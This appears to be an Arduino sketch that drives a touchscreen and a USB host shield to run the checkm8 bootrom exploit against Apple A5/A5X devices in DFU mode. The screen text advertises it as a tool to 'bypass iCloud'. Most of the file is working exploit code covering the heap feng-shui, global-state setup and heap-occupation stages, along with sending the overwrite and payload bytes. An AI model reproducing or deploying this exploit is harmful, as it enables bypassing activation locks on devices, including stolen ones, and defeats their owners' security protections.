#include <TouchScreen.h>
#include <Adafruit_GFX.h>
#include <Adafruit_GrayOLED.h>
#include <Adafruit_SPITFT.h>
#include <Adafruit_SPITFT_Macros.h>
#include <gfxfont.h>
#include <MCUFRIEND_kbv.h>
#define WHITE 0xFFFF
#define BLUE 0x001F
#define YP A1  // must be an analog pin, use "An" notation!
#define XM A2  // must be an analog pin, use "An" notation!
#define YM 9   // can be a digital pin
#define XP 8   // can be a digital pin
#define TS_MINX 0
#define TS_MAXX 320
#define TS_MINY 0
#define TS_MAXY 480
#define ILI9341_WHITE TFT_WHITE
#define ILI9341_GREEN TFT_GREEN
#define ILI9341_BLACK TFT_BLACK

TouchScreen ts = TouchScreen(XP, YP, XM, YM, 300);

// Создаем объект дисплея
MCUFRIEND_kbv tft;
// Создаем кнопку
Adafruit_GFX_Button startButton;

#include "Usb.h"

#define A5_8942
#include "constants.h"

USB Usb;
USB_DEVICE_DESCRIPTOR desc_buf;
uint8_t rcode;
uint8_t last_state, state;
bool is_apple_dfu = false;
uint8_t serial_idx = 0xff;

enum {
  CHECKM8_INIT_RESET,
  CHECKM8_HEAP_FENG_SHUI,
  CHECKM8_SET_GLOBAL_STATE,
  CHECKM8_HEAP_OCCUPATION,
  CHECKM8_END
};
uint8_t checkm8_state = CHECKM8_INIT_RESET;

uint8_t send_out(uint8_t * io_buf, uint8_t pktsize)
{
  Usb.bytesWr(rSNDFIFO, pktsize, io_buf);
  Usb.regWr(rSNDBC, pktsize);
  Usb.regWr(rHXFR, tokOUT);
  while (!(Usb.regRd(rHIRQ) & bmHXFRDNIRQ));
  Usb.regWr(rHIRQ, bmHXFRDNIRQ);
  uint8_t rcode = Usb.regRd(rHRSL) & 0x0f;
  return rcode;
}

#define PROGRESS_BAR_WIDTH 100 // Ширина прогресс-бара в пикселях
#define PROGRESS_BAR_HEIGHT 10 // Высота прогресс-бара в пикселях
#define PROGRESS_BAR_X 10 // Координата X начала прогресс-бара
#define PROGRESS_BAR_Y (tft.height() - PROGRESS_BAR_HEIGHT - 10) // Координата Y начала прогресс-бара

void drawProgressBar(int progress) {
  int filledWidth = (progress * PROGRESS_BAR_WIDTH) / 100; // Вычислить ширину заполненной части прогресс-бара

  // Нарисовать границу прогресс-бара
  tft.drawRect(PROGRESS_BAR_X, PROGRESS_BAR_Y, PROGRESS_BAR_WIDTH, PROGRESS_BAR_HEIGHT, ILI9341_WHITE);

  // Нарисовать заполненную часть прогресс-бара
  tft.fillRect(PROGRESS_BAR_X + 1, PROGRESS_BAR_Y + 1, filledWidth, PROGRESS_BAR_HEIGHT - 2, ILI9341_GREEN);

  // Нарисовать незаполненную часть прогресс-бара
  tft.fillRect(PROGRESS_BAR_X + 1 + filledWidth, PROGRESS_BAR_Y + 1, PROGRESS_BAR_WIDTH - filledWidth - 1, PROGRESS_BAR_HEIGHT - 2, ILI9341_BLACK);
}

void setup() {
  Serial.begin(115200);
  tft.println("checkm8 started");

  // Инициализируем дисплей
  uint16_t ID = tft.readID();
  if (ID == 0x9488) {
    tft.begin(ID);
    tft.fillScreen(0xFF00); // Заполняем экран черныс цветом
    tft.setRotation(0); // Устанавливаем ориентацию экрана

    // Устанавливаем цвет текста (белый)
    tft.setTextColor(0x00FF);
    // Устанавливаем размер текста
    tft.setTextSize(2);
    // Устанавливаем курсор в левый верхний угол
    tft.setCursor(0, 0);
    // Выводим текст
    tft.println(); // Пустая строка
    tft.println(" SmartMaster35Rus unlock ");
    tft.println(); // Пустая строка
    tft.println(" For bypass iCloud ");
    tft.println(" A5/A5X checkm8 ");
    tft.println(); // Пустая строка
    tft.println(); // Пустая строка
    tft.println(" Please connect the device DFU MODE and press the ");
    tft.println(" start button ");


    // Инициализируем кнопку
    startButton.initButton(
      &tft,  // Объект экрана
      60, 420, // Позиция X, Y
      100, 50, // Ширина и высота
      WHITE, // Цвет границы
      BLUE, // Цвет кнопки
      WHITE, // Цвет текста
      "Start", // Текст
      2 // Размер текста
    );
    startButton.drawButton(false); // Рисуем кнопку

  } else {
    tft.println("display init error");
  }

  if (Usb.Init() == -1) {
    tft.println("usb init error");
    tft.setTextColor(0xFFFF); // Устанавливаем цвет текста (белый)
    tft.setCursor(0, 0); // Устанавливаем курсор в левый верхний угол
    tft.println("usb init error"); // Выводим сообщение об ошибке на экран
  }

  delay(200);
}

// Определите переменную для отслеживания процента выполнения
int progress = 0;

void loop() {
  // Add your touchscreen check at the start of the loop() function
  TSPoint p = ts.getPoint();
  if (p.z > ts.pressureThreshhold) {
    p.x = map(p.x, TS_MINX, TS_MAXX, tft.width(), 0);
    p.y = map(p.y, TS_MINY, TS_MAXY, tft.height(), 0);

    if (startButton.contains(p.x, p.y)) {
      startButton.press(true);  // устанавливаем кнопку как нажатую
    } else {
      startButton.press(false);  // устанавливаем кнопку как не нажатую
    }
  } else {
    startButton.press(false);  // устанавливаем кнопку как не нажатую
  }

  if (startButton.justPressed()) {
    startButton.drawButton(true);  // рисуем кнопку как нажатую
    
    // Start the checkm8 process if it's not already running
    if(checkm8_state == -1) {
      checkm8_state = CHECKM8_INIT_RESET;
    }
  }

  if (startButton.justReleased()) {
    startButton.drawButton();  // рисуем кнопку как не нажатую
  }

  // The rest of your loop() function follows...
  Usb.Task();
  state = Usb.getUsbTaskState();

  if (state != last_state)
  {
    last_state = state;
  }
  if (state == USB_STATE_ERROR)
  {
    Usb.setUsbTaskState(USB_ATTACHED_SUBSTATE_RESET_DEVICE);
  }
  if (state == USB_STATE_RUNNING)
  {
    if (!is_apple_dfu)
    {
      Usb.getDevDescr(0, 0, 0x12, (uint8_t *) &desc_buf);
      if (desc_buf.idVendor != 0x5ac || desc_buf.idProduct != 0x1227)
      {
        Usb.setUsbTaskState(USB_ATTACHED_SUBSTATE_RESET_DEVICE);
        if (checkm8_state != CHECKM8_END)
        {
          Serial.print("Non Apple DFU found (vendorId: "); Serial.print(desc_buf.idVendor); Serial.print(", productId: "); Serial.print(desc_buf.idProduct); tft.println(")");
          delay(5000);
        }
        return;
      }
      is_apple_dfu = true;
      serial_idx = desc_buf.iSerialNumber;
    }

    switch (checkm8_state)
    {
      case CHECKM8_INIT_RESET:
        for (int i = 0; i < 3; i++)
        {
          digitalWrite(6, HIGH);
          delay(500);
          digitalWrite(6, LOW);
          delay(500);
        }
        checkm8_state = CHECKM8_HEAP_FENG_SHUI;
        Usb.setUsbTaskState(USB_ATTACHED_SUBSTATE_RESET_DEVICE);
        progress = 20;
        drawProgressBar(progress); // Отобразить прогресс-бар 20%
        break;
      case CHECKM8_HEAP_FENG_SHUI:
        heap_feng_shui();
        checkm8_state = CHECKM8_SET_GLOBAL_STATE;
        Usb.setUsbTaskState(USB_ATTACHED_SUBSTATE_RESET_DEVICE);
        progress = 40;
        drawProgressBar(progress); // Отобразить прогресс-бар 40%
        break;
      case CHECKM8_SET_GLOBAL_STATE:
        set_global_state();
        checkm8_state = CHECKM8_HEAP_OCCUPATION;
        Usb.setUsbTaskState(USB_ATTACHED_SUBSTATE_RESET_DEVICE);
        progress = 60;
        drawProgressBar(progress); // Отобразить прогресс-бар 60%
        break;
      case CHECKM8_HEAP_OCCUPATION:
        heap_occupation();
        checkm8_state = CHECKM8_END;
        Usb.setUsbTaskState(USB_ATTACHED_SUBSTATE_RESET_DEVICE);
        progress = 80;
        drawProgressBar(progress); // Отобразить прогресс-бар 80%
        break;
      case CHECKM8_END:
        digitalWrite(6, HIGH);
        tft.println("Done!");
        checkm8_state = -1;
        progress = 100;
        drawProgressBar(progress); // Отобразить прогресс-бар 100%
        break;
        
    }
  }
}

uint8_t heap_feng_shui_req(uint8_t sz, bool intok)
{
  uint8_t setup_rcode, data_rcode;
  setup_rcode = Usb.ctrlReq_SETUP(0, 0, 0x80, 6, serial_idx, 3, 0x40a, sz);
  uint8_t io_buf[0x40];

  if (intok)
  {
    data_rcode = Usb.dispatchPkt(tokIN, 0, 0);
    uint8_t pktsize = Usb.regRd(rRCVBC);
    Usb.bytesRd(rRCVFIFO, pktsize, io_buf);
    Usb.regWr(rHIRQ, bmRCVDAVIRQ);
  }
  Serial.print("heap_feng_shui_req: setup status = "); Serial.print(setup_rcode, HEX);
  Serial.print(", data status = "); tft.println(data_rcode, HEX);
  return setup_rcode;
}

void heap_feng_shui()
{
  tft.println("1. heap feng-shui");

  rcode = Usb.ctrlReq(0, 0, 2, 3, 0, 0, 0x80, 0, 0, 0, 0);
  Serial.print("Stall status: "); tft.println(rcode, HEX);

  Usb.regWr(rHCTL, bmRCVTOG1);
  int success = 0;
  while (success != 620)
  {
    if (heap_feng_shui_req(0x80, true) == 0)
      success++;
  }
  heap_feng_shui_req(0x81, true); // no leak

  /* a8 testing
    // heap_feng_shui_req(0xc0, true); // stall
    heap_feng_shui_req(0xc0, true); // leak
    for(int i = 0; i < 40; i++)
    heap_feng_shui_req(0xc1, true); // no leak
  */
}

void set_global_state()
{
  tft.println("2. set global state");

  uint8_t tmpbuf[0x40];
  memset(tmpbuf, 0xcc, sizeof(tmpbuf));

  rcode = Usb.ctrlReq_SETUP(0, 0, 0x21, 1, 0, 0, 0, 0x40);
  //Usb.regWr(rHCTL, bmSNDTOG0);
  rcode = send_out(tmpbuf, 0x40);
  Serial.print("OUT pre-packet: "); tft.println(rcode, HEX);
  rcode = send_out(tmpbuf, 0x40);
  Serial.print("Send random 0x40 bytes: "); tft.println(rcode, HEX);
  rcode = Usb.dispatchPkt(tokINHS, 0, 0);
  Serial.print("Send random 0x40 bytes HS: "); tft.println(rcode, HEX);

  rcode = Usb.ctrlReq(0, 0, 0x21, 1, 0, 0, 0, 0, 0, 0, 0);
  Serial.print("Send zero length packet: "); tft.println(rcode, HEX);

  rcode = Usb.ctrlReq(0, 0, 0xA1, 3, 0, 0, 0, 6, 6, tmpbuf, 0);
  Serial.print("Send get status #1: "); tft.println(rcode, HEX);

  rcode = Usb.ctrlReq(0, 0, 0xA1, 3, 0, 0, 0, 6, 6, tmpbuf, 0);
  Serial.print("Send get status #2: "); tft.println(rcode, HEX);


  rcode = Usb.ctrlReq_SETUP(0, 0, 0x21, 1, 0, 0, 0, padding + 0x40);
  uint8_t io_buf[0x40];
  for (int i = 0; i < ((padding + 0x40) / 0x40); i++)
  {
    rcode = send_out(io_buf, 0x40);
    Serial.print("    data: "); tft.println(rcode, HEX);
    if (rcode)
    {
      tft.println("sending error");
      checkm8_state = CHECKM8_END;
      return;
    }
  }
}

void heap_occupation()
{
  tft.println("3. heap occupation");

  Usb.regWr(rHCTL, bmRCVTOG1);
  heap_feng_shui_req(0x81, true); // no leak

  //tft.println("!!! Enable debugging/dump sram here !!!");
  //delay(10000);

  uint8_t tmpbuf[0x40];

  tft.println("overwrite sending ...");
  rcode = Usb.ctrlReq_SETUP(0, 0, 0, 0, 0, 0, 0, 0x40);
  Serial.print("    SETUP: "); tft.println(rcode, HEX);
  //Usb.regWr(rHCTL, bmSNDTOG0);
  memset(tmpbuf, 0xcc, sizeof(tmpbuf));
  rcode = send_out(tmpbuf, 0x40);
  Serial.print("    OUT (pre packet): "); tft.println(rcode, HEX);
  for (int i = 0; i < 0x40; i++)
    tmpbuf[i] = pgm_read_byte(overwrite + i);
  rcode = send_out(tmpbuf, 0x40);
  Serial.print("    OUT: "); tft.println(rcode, HEX);

  tft.println("payload sending ...");
  rcode = Usb.ctrlReq_SETUP(0, 0, 0x21, 1, 0, 0, 0, sizeof(payload));
  Serial.print("    SETUP: "); tft.println(rcode, HEX);
  //Usb.regWr(rHCTL, bmSNDTOG0);
  memset(tmpbuf, 0xcc, sizeof(tmpbuf));
  rcode = send_out(tmpbuf, 0x40);
  Serial.print("    OUT (pre packet): "); tft.println(rcode, HEX);
  for (int i = 0; i < sizeof(payload); i += 0x40)
  {
    for (int j = 0; j < 0x40; j++)
      tmpbuf[j] = pgm_read_byte(payload + i + j);
    rcode = send_out(tmpbuf, 0x40);
    Serial.print("    OUT: "); tft.println(rcode, HEX);
  }
}
